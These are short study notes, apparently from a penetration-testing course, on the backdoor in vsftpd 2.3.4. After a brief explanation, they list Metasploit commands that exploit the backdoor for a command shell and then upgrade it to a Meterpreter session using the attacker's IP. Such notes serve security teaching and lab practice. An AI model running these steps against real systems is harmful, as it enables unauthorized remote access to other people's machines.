* **vsftpd**
  * An FTP server for unix-like systems including Linux.
  * A default FTP server for Ubuntu, CentOS and Fedora.
  * **What is the vulnerability**
  * vsftpd V2.3.4 is vulnerable to a command execution vulnerability
  * Facilitated by a malicious backdoor
  * This backdoor is added to the vsftpd download archive through a supply chain attack, so that legitimate users were downloading this malicious backdoor.
 
  * PRACTICAL
  * `use exploit/unix/ftp/vsftpd_234_backdoor`
  * `setg rhosts`
  * `run` --> This should give a command shell on the target
  * `/bin/bash -i`
  * **To get a meterpreeter session**
  * `use post/multi/manage/shell_to_meterpreter`
  * `set lhost[Attacker's IP]`
  * `set session [ID of the session with command shell]`
  * `run`
